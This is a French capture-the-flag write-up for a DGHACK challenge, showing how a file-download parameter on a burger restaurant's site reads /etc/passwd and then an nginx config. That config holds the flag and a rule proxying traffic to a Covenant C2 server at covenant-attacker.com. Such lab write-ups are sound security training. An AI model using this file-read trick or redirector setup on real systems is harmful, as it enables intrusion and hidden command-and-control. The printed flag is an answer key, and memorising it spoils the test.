50 POINTS

## Description
Des analystes SOC du Ministère des Armées ont remarqué des flux suspects provenant de machines internes vers un site vitrine d'une entreprise. Pourtant ce site semble tout à fait légitime.

Vous avez été mandaté par la Direction Générale de l'Armement pour mener l'enquête. Trouvez un moyen de reprendre partiellement le contrôle du site web afin de trouver comment ce serveur joue un rôle dans l'infrastructure de l'acteur malveillant.

Aucun fuzzing n'est nécessaire.

Le flag se trouve sur le serveur à l'endroit permettant d'en savoir plus sur l'infrastructure de l'attaquant.

## Solution
Le site est un site d'un resto de burger.

Rapidement, je trouve un lien pour télécharger le menu du resto : 

`http://unchasseursachantchasser.chall.malicecyber.com/download.php?menu=menu_updated_09_11_2022.jpg`

On voit que le nom du fichier est placé en argument.

On essaye :

`http://unchasseursachantchasser.chall.malicecyber.com/download.php?menu=/etc/passwd`

Et on a bien téléchargé le fichier `/etc/passwd` ! On peut donc récupérer tous les fichiers lisibles sur la machine.

D'après l'énoncé, on cherche un fichier lié à de la config réseau. De plus, le header HTTP `Server : nginx` nous apprend qu'il s'agit d'un serveur nginx.

Un fichier classique de config nginx est `/etc/nginx/nginx.conf`. On le récupère et on trouve le flag en commentaire à côté d'informations intéressantes pour la deuxième partie du challenge.

```
# Website Acquisition : done.
# This rule is to become our redirector c2.
# Covenant 5.0 works on a Linux docker.
# The GRUNT port must be tcp/8000-8250.
# DGHACK{L3s_D0ux_Burg3r5_se_s0nt_f4it_pwn_:(}
location ^~ /1d8b4cf854cd42f4868849c4ce329da72c406cc11983b4bf45acdae0805f7a72 {
    limit_except GET POST PUT { deny all; }
    rewrite /1d8b4cf854cd42f4868849c4ce329da72c406cc11983b4bf45acdae0805f7a72/(.*) /$1  break;
    proxy_pass https://covenant-attacker.com:7443;
}
```


**DGHACK{L3s_D0ux_Burg3r5_se_s0nt_f4it_pwn_:(}**